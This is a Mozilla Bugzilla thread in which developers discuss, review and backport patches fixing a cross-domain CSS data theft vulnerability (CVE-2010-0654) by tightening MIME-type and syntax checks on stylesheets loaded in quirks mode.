Status: ASSIGNED → RESOLVEDClosed: 15 years agoKeywords: [dev-doc-needed](/buglist.cgi?keywords=dev-doc-needed&resolution=---)Resolution: --- → FIXED

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a5325190_3881)• 15 years ago |

Depends on: [536603](/show_bug.cgi?id=536603 "RESOLVED INACTIVE - Intermittent layout/style/test/test_css_cross_domain.html | quirks IB1l - got rgb(255, 0, 0), expected rgb(0, 255, 0)")

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=524223#c48)• 15 years ago |
|  | |

This seems to be public now at:
<http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html>

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a6262176_11608)• 15 years ago |

Group: core-securityWhiteboard: [sg:moderate] embargoed until at least 2009-12-28, possibly as long as Apr-2010. webkit fix checked in → [sg:moderate]

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=524223#c49)• 15 years ago |
|  | |

I think we're making the right long-term decision here. But to limit short-term damage to privacy/security without breaking sites too suddenly, perhaps we should take the yucky-heuristic patch on the 1.9.2 branch.
Does webkit plan to change to a more strict approach?

|  | [Chris Evans](/user_profile?user_id=322399) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=524223#c50)• 15 years ago |
|  | |

I don't know what WebKit's longer term plans are. It would indeed be nice to rip out the more subtle logic and just insist on a correct MIME type.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a6320442_1689)• 15 years ago |

Whiteboard: [sg:moderate] → [sg:moderate][3.6.x]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=524223#c51)• 15 years ago |
|  | |

Is it at all realistic to get this into Firefox 3.5.8, or is there too much risk of site breakage to land that quickly?blocking1.9.1: needed → ?

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=524223#c52)• 15 years ago |
|  | |

Attached patch

[1.9.2 branch patch, with the "valid first initial construct" heuristic](attachment.cgi?id=420591&action=diff) (obsolete)
— [Details](attachment.cgi?id=420591&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=420591)

Here's an implementation of the "valid first initial construct" heuristic for 1.9.2, and I think it would be straightforward to backport to 1.9.1 as well, assuming the CSSLoader is more or less the same there.
Instead of modifying nsCSSParser, I wrote a second mini-parser that just answers the yes-no question "does the first thing in this string smell like CSS?" based on the css2.1 "generic" grammar plus some bits of css3-selectors. [The "generic" grammar by itself would do us no good, as its laxity is what got us into this mess in the first place!] It's in the file nsCSSCheckInitialSyntax.cpp, and its API is one function:
bool mozilla::CSS::InitialSyntaxIsValid(const nsAString& sheet);
To make this work I had to modify the CSSLoader so that it consumes the entire input stream in SheetLoadData::OnStreamComplete, and then hands a string rather than an nsIUnicharInputStream to the parser. This \*might\* have performance implications, but note that we were already waiting to run the real parser until all the data came off the network, anyway. And I want to make the same change on trunk so that I can do lazy computation of file position for error messages (but that's blocked on my deCOM patches, still waiting for review IIRC).
I need some advice on how I can test the mini-parser more thoroughly. It is hardly ever invoked from the normal code paths, so a standalone xpcom unit test makes most sense to me, but I don't really know how to write those.
[Attachment #420591](/attachment.cgi?id=420591&action=edit "1.9.2 branch patch, with the \"valid first initial construct\" heuristic") -
Flags: review?(dbaron)

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=524223#c53)• 15 years ago |
|  | |

Probably the easiest way to write tests for it is to expose a function on something that calls it (maybe DOMWindowUtils) and then write the tests as mochitests.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a6648481_1689)• 15 years ago |

blocking1.9.1: ? → neededblocking2.0: --- → ?

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=524223#c54)• 15 years ago |
|  | |

Attached patch

[1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed](attachment.cgi?id=420842&action=diff) (obsolete)
— [Details](attachment.cgi?id=420842&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=420842)

(In reply to [comment #53](/show_bug.cgi?id=524223#c53 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Probably the easiest way to write tests for it is to expose a function on
> something that calls it (maybe DOMWindowUtils) and then write the tests as
> mochitests.
I like that idea. Here's a revised patch with more tests for the parser, and several parser bugs fixed that the tests found. I assume that for a branch patch I should be adding to nsDOMWindowUtils\_1\_9\_2 rather than nsDOMWindowUtils.
[Attachment #420591](/attachment.cgi?id=420591&action=edit "1.9.2 branch patch, with the \"valid first initial construct\" heuristic") -
Attachment is obsolete: true
[Attachment #420842](/attachment.cgi?id=420842&action=edit "1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed") -
Flags: review?(dbaron)
[Attachment #420591](/attachment.cgi?id=420591&action=edit "1.9.2 branch patch, with the \"valid first initial construct\" heuristic") -
Flags: review?(dbaron)

|  | [Robert O'Callahan (:roc) (email my personal email if necessary)](/user_profile?user_id=5038) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a8334118_5038)• 15 years ago |

blocking2.0: ? → alpha1Priority: -- → P1

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=524223#c55)• 15 years ago |
|  | |

An alternative heuristic occurred to me last week. Detecting "this \*is\* CSS" is hard, because the selector syntax is very sloppy, but detecting "this \*isn't\* CSS" is easy for the cases we care about, and could be done in OnDetermineCharset without reading the entire sheet into memory, thus would be less invasive. I think this sniffing algorithm would cover everything interesting: decode to Unicode, skip any initial sequence of ASCII whitespace, then blacklist if the next 16 characters include a control character other than whitespace (U+0000-0008, U+000E-001F, U+007F-009F) or the first characters after the whitespace are
< (HTML or XML)
{ (JSON)
%! (PDF/PS)
#! (Unix-type script)
!< (Unix 'ar' archive)
The "next eight characters include a control character" rule covers nearly all the image, video, audio, compressed, and machine-code formats I know about. The big thing this can't catch is plain-text structured data with no magic number, such as JavaScript and CSV files.
The big reason \*not\* to do this, IMO, is that it's seriously inconsistent with what's been put into Webkit.

|  | [Reed Loden [:reed]](/user_profile?user_id=159758) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a10619900_159758)• 15 years ago |

Alias: CVE-2010-0654blocking1.9.2: --- → ?
[status1.9.2](/buglist.cgi?f1=cf_status_192&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_192&o1=equals&v1=%3F)Flags: blocking1.9.0.19?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a10706383_1689)• 15 years ago |

blocking1.9.2: ? → needed
[status1.9.2](/buglist.cgi?f1=cf_status_192&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_192&o1=equals&v1=%3F) → [wanted](/buglist.cgi?f1=cf_status_192&o1=equals&v1=wanted)Flags: blocking1.9.0.19? → blocking1.9.0.19-

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=524223#c56)• 15 years ago |
|  | |

Comment on [attachment 420842](/attachment.cgi?id=420842 "1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed") [[details]](/attachment.cgi?id=420842&action=edit "1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed") [[diff]](/attachment.cgi?id=420842&action=diff "1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=420842)
1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed
at a face-to-face meeting we agreed to do this differently. Stay tuned.
[Attachment #420842](/attachment.cgi?id=420842&action=edit "1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed") -
Flags: review?(dbaron)

|  | [Hixie (not reading bugmail)](/user_profile?user_id=4054) |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=524223#c57)• 15 years ago |
|  | |

Whether this ends up being a heuristic or some specific logic, please let the CSSWG know so it can be specified (or if they refuse to do it, let me know and I'll do it in HTML5 instead, though that would be inappropriate given @import).

|  | [Simon Pieters [:zcorpan]](/user_profile?user_id=169574) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=524223#c58)• 15 years ago |
|  | |

(In reply to [comment #4](/show_bug.cgi?id=524223#c4 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Therefore, the solution devised was:
> - Reject a CSS load if all of these are met:
> a) It is cross-domain load (making sure a redirect does not confuse the domain
> check)!
> b) Not a valid MIME type (text/css, application/x-unknown-content-type or
> empty).
> c) The alleged CSS does not start with a syntactically valid CSS construct.
>
> The above rules will block the attack because an HTML, XML etc. header will
> always cause a broken first CSS descriptor.
(In reply to [comment #55](/show_bug.cgi?id=524223#c55 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> An alternative heuristic occurred to me last week. Detecting "this \*is\* CSS"
> is hard, because the selector syntax is very sloppy, but detecting "this
> \*isn't\* CSS" is easy for the cases we care about, and could be done in
> OnDetermineCharset without reading the entire sheet into memory, thus would be
> less invasive. I think this sniffing algorithm would cover everything
> interesting: decode to Unicode, skip any initial sequence of ASCII whitespace,
> then blacklist if the next 16 characters include a control character other than
> whitespace (U+0000-0008, U+000E-001F, U+007F-009F) or the first characters
> after the whitespace are
>
> < (HTML or XML)
"<!--" is a valid CSS construct. I think it's even a fairly common first construct in external style sheets on the Web, but I don't have numbers at hand.
"<!--" is a valid CSS construct. (I think it's also a fairly common first
construct in external style sheets on the Web, but I don't have numbers at
hand.)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=524223#c59)• 15 years ago |
|  | |

(In reply to [comment #57](/show_bug.cgi?id=524223#c57 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Whether this ends up being a heuristic or some specific logic, please let the
> CSSWG know so it can be specified (or if they refuse to do it, let me know and
> I'll do it in HTML5 instead, though that would be inappropriate given @import).
We intend any heuristic to be a stopgap for Firefox 3.6, and not to be standardized; the behavior in 3.7 and subsequent will be that the quirk rule at the end of HTML5 4.12.3.14 (Link type "stylesheet") is not applied for cross-domain loads. In other words, even in quirks mode, a cross-domain stylesheet must be served as text/css, or without a Content-Type, to be applied. That looks like a straightforward change on your end.
dbaron probably knows better than me, but I don't see anything relevant specified in CSS at present. I think maybe CSS should just say that @import behaves the same as a link to an external stylesheet resource from the non-CSS document at the root of the @import chain.
(In reply to [comment #58](/show_bug.cgi?id=524223#c58 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> "<!--" is a valid CSS construct. I think it's even a fairly common first
> construct in external style sheets on the Web, but I don't have numbers at
> hand.
That's unfortunate; "<!--" is only a valid CSS construct for the sake of backward compatibility of \*inline\* style sheets with antediluvian browsers that don't understand the <style> tag. There's no good reason for it ever to appear in an external style sheet. Is it possible for you to get those numbers?

|  | [Eric Shepherd [:sheppy]](/user_profile?user_id=241123) |  |
| --- | --- | --- |
| [Comment 60](/show_bug.cgi?id=524223#c60)• 15 years ago |
|  | |

From what I gather after reading all this, the main documentation issue here is to mention that CSS won't be loaded cross-domain anymore if the MIME type isn't text/css? There's actually more going on than that, but that seems to be the main thing to mention, as well as perhaps that the syntax of CSS documents is checked a little more thoroughly than before. I don't really think specifics are needed.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 61](/show_bug.cgi?id=524223#c61)• 15 years ago |
|  | |

(In reply to [comment #60](/show_bug.cgi?id=524223#c60 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> From what I gather after reading all this, the main documentation issue here is
> to mention that CSS won't be loaded cross-domain anymore if the MIME type isn't
> text/css? There's actually more going on than that, but that seems to be the
> main thing to mention, as well as perhaps that the syntax of CSS documents is
> checked a little more thoroughly than before. I don't really think specifics
> are needed.
Yes, I think the documentation's position should be "serve CSS as text/css, and serve other things with their correct MIME types too".
Also, be very clear that this is only about quirks mode documents. Standards mode documents have always enforced the correct MIME type on CSS. Quirks mode documents will, going forward, require the correct MIME type on style loaded cross-domain. There may be a backward compatibility heuristic added to 3.6 but it will only be for 3.6.

|  | [Eric Shepherd [:sheppy]](/user_profile?user_id=241123) |  |
| --- | --- | --- |
| [Comment 62](/show_bug.cgi?id=524223#c62)• 15 years ago |
|  | |

Will there be a particular sub-version of Gecko that has this fix? Will I be able to say that this will affect "Gecko 1.9.2.x"?

|  | [Eric Shepherd [:sheppy]](/user_profile?user_id=241123) |  |
| --- | --- | --- |
| [Comment 63](/show_bug.cgi?id=524223#c63)• 15 years ago |
|  | |

At any rate, I've added text on this subject here:
<https://developer.mozilla.org/en/Properly_Configuring_Server_MIME_Types#Why_are_correct_MIME_types_important.3f>
This note needs to be updated once we know specifically what version of Firefox & Gecko it applies to.

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Comment 64](/show_bug.cgi?id=524223#c64)• 15 years ago |
|  | |

Safari 4.0.5 contains a fix, hopefully the same as Chrome's. See [CVE-2010-0051](https://www.cve.org/CVERecord?id=CVE-2010-0051) on <http://support.apple.com/kb/HT4070>.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 65](/show_bug.cgi?id=524223#c65)• 15 years ago |
|  | |

Attached patch

[1.9.2 branch patch with new heuristic](attachment.cgi?id=438197&action=diff) (obsolete)
— [Details](attachment.cgi?id=438197&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438197)

At the platform meeting ... two months ago already? geez, I'm slow ... dbaron asked that the 1.9.2 patch be rewritten to not involve a new miniparser on the side. This I have now done.
Upside: no new miniparser, no need to slurp the entire style sheet before processing, no mucking around in xpcom/io. Overall, considerably less invasive (a surprise to me, as the whole point of the miniparser was to make the patch less invasive).
Downside: easiest seen by looking at the changes to test\_css\_cross\_domain\_miniparser.html (which I did not bother renaming) -- because we're using the real parser, the first selector in the file must be semantically meaningful to this version of Gecko, not just well-formed. That could potentially break a site that was in quirks mode, with a cross-domain style sheet, with the wrong MIME type, and the very first thing in that sheet was a shiny bleeding edge CSS selector that 1.9.2 doesn't recognize.
I leave it to product management to decide whether this is a better tradeoff than the previous patch had.
I also beefed up the error console diagnostics -- they distinguish cross-domain from non-cross-domain quirks mode style sheet loads, and if we bail out on the style sheet because of a syntax error, we say so. This means string changes, unfortunately.
Will post links to try server builds when they complete.
[Attachment #420842](/attachment.cgi?id=420842&action=edit "1.9.2 branch patch (with heuristic) v2: more tests, bugs fixed") -
Attachment is obsolete: true
[Attachment #438197](/attachment.cgi?id=438197&action=edit "1.9.2 branch patch with new heuristic") -
Flags: review?(dbaron)

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a14516557_34122)• 15 years ago |

[Attachment #438197](/attachment.cgi?id=438197&action=edit "1.9.2 branch patch with new heuristic") -
Flags: approval1.9.2.4?

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 66](/show_bug.cgi?id=524223#c66)• 15 years ago |
|  | |

A few issues from skimming:
\* you can't make l10n changes on the branch (css.properties)
\* I'd prefer if the new DOMWindowUtils function checked for UniversalXPConnect just like most of the other DOMWindowUtils methods; your test can enable that trivially
\* I think it would be better to avoid modifying nsICSSParser; it's relatively avoidable (at worst, add nsICSSParser\_MOZILLA\_1\_9\_2\_BRANCH)
I'd somewhat prefer to review a patch addressing those issues than going into a detailed review of this one.

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a14517432_3881)• 15 years ago |

[Attachment #438197](/attachment.cgi?id=438197&action=edit "1.9.2 branch patch with new heuristic") -
Flags: review?(dbaron) → review-

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 67](/show_bug.cgi?id=524223#c67)• 15 years ago |
|  | |

(In reply to [comment #66](/show_bug.cgi?id=524223#c66 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> A few issues from skimming:
> \* you can't make l10n changes on the branch (css.properties)
Is there no way around this? Outreach to people who need to fix their websites will be a lot easier if the diagnostics are clear.
> \* I'd prefer if the new DOMWindowUtils function checked for UniversalXPConnect
> just like most of the other DOMWindowUtils methods; your test can enable that
> trivially
Ok
> \* I think it would be better to avoid modifying nsICSSParser; it's relatively
> avoidable (at worst, add nsICSSParser\_MOZILLA\_1\_9\_2\_BRANCH)
I can't add methods to an XPCOM interface without bumping the IID, right? So the only thing that comes to mind is sticking the bit into nsCSSStyleSheet and letting the parser know that all nsICSSStyleSheets are nsCSSStyleSheets. Is that going to cause some other problem somewhere?
> I'd somewhat prefer to review a patch addressing those issues than going into a
> detailed review of this one.
Sure (but it won't be till Monday, regardless).

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 68](/show_bug.cgi?id=524223#c68)• 15 years ago |
|  | |

(In reply to [comment #67](/show_bug.cgi?id=524223#c67 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> > \* I think it would be better to avoid modifying nsICSSParser; it's relatively
> > avoidable (at worst, add nsICSSParser\_MOZILLA\_1\_9\_2\_BRANCH)
>
> I can't add methods to an XPCOM interface without bumping the IID, right? So
> the only thing that comes to mind is sticking the bit into nsCSSStyleSheet and
> letting the parser know that all nsICSSStyleSheets are nsCSSStyleSheets. Is
> that going to cause some other problem somewhere?
If you add nsICSSParser\_MOZILLA\_1\_9\_2\_BRANCH : public nsICSSParser, add a new method (and leave the old one with the old behavior... the implementation just calls the new one), and make the caller that needs the method QI to nsICSSParser\_MOZILLA\_1\_9\_2\_BRANCH instead of nsICSSParser, you should be fine.
> Sure (but it won't be till Monday, regardless).
FWIW, I'll be mostly-unreachable next week.

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 69](/show_bug.cgi?id=524223#c69)• 15 years ago |
|  | |

(In reply to [comment #67](/show_bug.cgi?id=524223#c67 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> Is there no way around this? Outreach to people who need to fix their websites
> will be a lot easier if the diagnostics are clear.
English-only messages are a possibility.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 70](/show_bug.cgi?id=524223#c70)• 15 years ago |
|  | |

Try server builds are now up:
[http://build.mozilla.org/tryserver-builds/zweinberg@mozilla.com-try-d39a77cae9ff](http://build.mozilla.org/tryserver-builds/zweinberg%40mozilla.com-try-d39a77cae9ff)

|  | [Reed Loden [:reed]](/user_profile?user_id=159758) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a14675403_159758)• 15 years ago |

[Attachment #438197](/attachment.cgi?id=438197&action=edit "1.9.2 branch patch with new heuristic") -
Flags: approval1.9.2.4?

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 71](/show_bug.cgi?id=524223#c71)• 15 years ago |
|  | |

Attached patch

[1.9.2 branch patch with dbaron's high-level changes made](attachment.cgi?id=438558&action=diff) (obsolete)
— [Details](attachment.cgi?id=438558&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558)

This revision adds nsICSSParser\_1\_9\_2, doesn't touch css.properties, and has the DOMWindowUtils hook check for UniversalXPConnect privileges.
The new nsICSSParser\_1\_9\_2 method always does the check, and nsCSSLoader only QIs for that method when it needs the check done; this is just to minimize overhead. SheetLoadData::ReportMimeProblem got a lot uglier, but I think it's the best that can be done given the l10n constraints. (It's unfortunate that nsContentUtils does not have a ReportToConsole variant that takes the actual string to log rather than the localization tag.)
[Attachment #438197](/attachment.cgi?id=438197&action=edit "1.9.2 branch patch with new heuristic") -
Attachment is obsolete: true
[Attachment #438558](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") -
Flags: review?(dbaron)
[Attachment #438558](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") -
Flags: approval1.9.2.4?

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 72](/show_bug.cgi?id=524223#c72)• 15 years ago |
|  | |

Attached patch

[1.9.2 patch backported to 1.9.1](attachment.cgi?id=439488&action=diff) (obsolete)
— [Details](attachment.cgi?id=439488&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=439488)

This is the same as [attachment 438558](/attachment.cgi?id=438558 "1.9.2 branch patch with dbaron's high-level changes made") [[details]](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") [[diff]](/attachment.cgi?id=438558&action=diff "1.9.2 branch patch with dbaron's high-level changes made") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558) but for 1.9.1. It builds, but I'm unfortunately not able to run the mochitests.
[Attachment #439488](/attachment.cgi?id=439488&action=edit "1.9.2 patch backported to 1.9.1") -
Flags: review?

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=524223#a15066229_47192)• 15 years ago |

[Attachment #439488](/attachment.cgi?id=439488&action=edit "1.9.2 patch backported to 1.9.1") -
Flags: review? → review?(dbaron)

|  | [Mike Beltzner [:beltzner, not reading bugmail]](/user_profile?user_id=137548) |  |
| --- | --- | --- |
| [Comment 73](/show_bug.cgi?id=524223#c73)• 15 years ago |
|  | |

Comment on [attachment 438558](/attachment.cgi?id=438558 "1.9.2 branch patch with dbaron's high-level changes made") [[details]](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") [[diff]](/attachment.cgi?id=438558&action=diff "1.9.2 branch patch with dbaron's high-level changes made") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558)
1.9.2 branch patch with dbaron's high-level changes made
Moving nomination flag to 1.9.2.5 - don't think we want to mix this with OOPP, already doing enough this release :)
[Attachment #438558](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") -
Flags: approval1.9.2.4? → approval1.9.2.5?

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 74](/show_bug.cgi?id=524223#c74)• 15 years ago |
|  | |

Comment on [attachment 438558](/attachment.cgi?id=438558 "1.9.2 branch patch with dbaron's high-level changes made") [[details]](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") [[diff]](/attachment.cgi?id=438558&action=diff "1.9.2 branch patch with dbaron's high-level changes made") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558)
1.9.2 branch patch with dbaron's high-level changes made
>+ if (mLoader->mCompatMode == eCompatibility\_NavQuirks) {
>+ problem = MimeProblem\_quirksload;
>+ if (mLoaderPrincipal) {
>+ PRBool subsumed;
>+ result = mLoaderPrincipal->Subsumes(principal, &subsumed);
>+ if (NS\_FAILED(result) || !subsumed) {
>+ problem = MimeProblem\_quirksload\_xd;
>+ mCheckInitialSyntax = PR\_TRUE;
>+ }
>+ }
>+ }
Is this the right handling of null mLoaderPrincipal, or should we assume
that that means cross-domain? (Is this a case of null == system
principal?)
>- NS\_ASSERTION(aLinkingContent, "Inline stylesheet without linking content?");
>- baseURI = aLinkingContent->GetBaseURI();
>- sheetURI = aLinkingContent->GetDocument()->GetDocumentURI();
>- originalURI = nsnull;
>- } else {
>+ NS\_ASSERTION(aLinkingContent, "Inline stylesheet without linking content?");
>+ baseURI = aLinkingContent->GetBaseURI();
>+ sheetURI = aLinkingContent->GetDocument()->GetDocumentURI();
>+ originalURI = nsnull;
>+ } else {
No need to reindent (or tabify, or whatever this is).
>+ rv = errObj->Init(formattedMessage.get(),
>+ NS\_ConvertUTF8toUTF16(referrer).get(),
>+ nsnull, 0, 0, errorFlag, "CSS Loader");
Is EmptyString().get() better than nsnull?
Instead of changing SkipAtRule() to return false, I'd prefer if
you made its return type void and changed its callers to return
false in the two relevant locations.
I'd suggest also changing ParsePageRule to |return PR\_TRUE|, with a
comment explaining that it's a temporary change just for the purpose of
this, so that we accept style sheets that start with @page. (And add a
test for that case?)
r=dbaron with that
[Attachment #438558](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") -
Flags: review?(dbaron) → review+

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 75](/show_bug.cgi?id=524223#c75)• 15 years ago |
|  | |

Comment on [attachment 439488](/attachment.cgi?id=439488 "1.9.2 patch backported to 1.9.1") [[details]](/attachment.cgi?id=439488&action=edit "1.9.2 patch backported to 1.9.1") [[diff]](/attachment.cgi?id=439488&action=diff "1.9.2 patch backported to 1.9.1") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=439488)
1.9.2 patch backported to 1.9.1
Please redo the backport based on the new patch, \*once it is revised to address the comments I just made\*. (And, in general, please don't request review on a backport for a patch that hasn't been reviewed yet; it just artificially increases apparent review load.)
[Attachment #439488](/attachment.cgi?id=439488&action=edit "1.9.2 patch backported to 1.9.1") -
Flags: review?(dbaron) → review-

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122)  Assignee |  |
| --- | --- | --- |
| [Comment 76](/show_bug.cgi?id=524223#c76)• 15 years ago |
|  | |

(In reply to [comment #74](/show_bug.cgi?id=524223#c74 "RESOLVED FIXED - Cross-domain data theft using CSS"))
> (From update of [attachment 438558](/attachment.cgi?id=438558 "1.9.2 branch patch with dbaron's high-level changes made") [[details]](/attachment.cgi?id=438558&action=edit "1.9.2 branch patch with dbaron's high-level changes made") [[diff]](/attachment.cgi?id=438558&action=diff "1.9.2 branch patch with dbaron's high-level changes made") [[review]](/page.cgi?id=splinter.html&ignore=&bug=524223&attachment=438558))
> >+ if (mLoader->mCompatMode == eCompatibility\_NavQuirks) {
> >+ problem = MimeProblem\_quirksload;
> >+ if (mLoaderPrincipal) {
> >+ PRBool subsumed;
> >+ result = mLoaderPrincipal->Subsumes(principal, &subsumed);
> >+ if (NS\_FAILED(result) || !subsumed) {
> >+ problem = MimeProblem\_quirksload\_xd;
> >+ mCheckInitialSyntax = PR\_TRUE;
> >+ }
> >+ }
> >+ }
>
> Is this the right handling of null mLoaderPrincipal, or should we assume
> that that means cross-domain? (Is this a case of null == system
> principal?)
I'm not familiar with any rules for when a null nsIPrincipal\* pointer means the system principal and when it doesn't, but LoadSheet skips a CheckMayLoad call if mLoaderPrincipal is null, so that seems like it's supposed to mean the system principal in this context. Also, it appears to me that mLoaderPrincipal will be null at this point only if a null origin principal was passed to InternalLoadNonDocumentSheet, which is only accessible to C++ as far as I can tell.
mLoaderPrincipal is also null for SheetLoadData objects created by LoadInlineStyle, but that code path goes directly to ParseSheet without calling OnStreamComplete, and the loader for child sheets always uses the sheet principal (== the node principal for the <style> tag, in this case). And it's null for SheetLoadData objects created by PostLoadEvent, but it appears to me that that is only used for sheets which have already been loaded, and so will not come back to OnStreamComplete.
> No need to reindent (or tabify, or whatever this is).
That appears to have been me fatfingering the indentation there. Fixed.
> >+ rv = errObj->Init(formattedMessage.get(),
> >+ NS\_ConvertUTF8toUTF16(referrer).get(),
> >+ nsnull, 0, 0, errorFlag, "CSS Loader");
>
> Is EmptyString().get() better than nsnull?
It comes to the same thing, since ultimately whatever we provide here is passed to the PRUnichar\* overload of nsString::Assign(), which treats null as the empty string, but with a comment reading "unfortunately some callers pass null :-(", so maybe it should be changed to EmptyString().get() even though it's functionally equivalent - up to you.
> Instead of changing SkipAtRule() to return false, I'd prefer if
> you made its return type void and changed its callers to return
> false in the two relevant locations.
Done.
> I'd suggest also changing ParsePageRule to |return PR\_TRUE|, with a
> comment explaining that it's a temporary change just for the purpose of
> this, so that we accept style sheets that start with @page. (And add a
> test for that case?)
Done.
Tangential question: it occurs to me that we should, perhaps, make trunk do this heuristic for the case of an absent Content-Type header, since that officially does mean "sniff", and sites that leave HTML content untagged would still be vulnerable to this attack if we blindly assume untagged is good CSS (as we currently do on trunk). On the other hand, that does mean we're stuck with the heuristic going forward; but it's not nearly so ugly as it was the first time around (and would be less ugly still on trunk, where I can change interfaces and strings ;) What do you think?
I'll update the 1.9.1 backport. Do we need a 1.9.0 backport still?

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 77](/show_bug.cgi?id=524223#c77)• 15 years ago |
|  | |

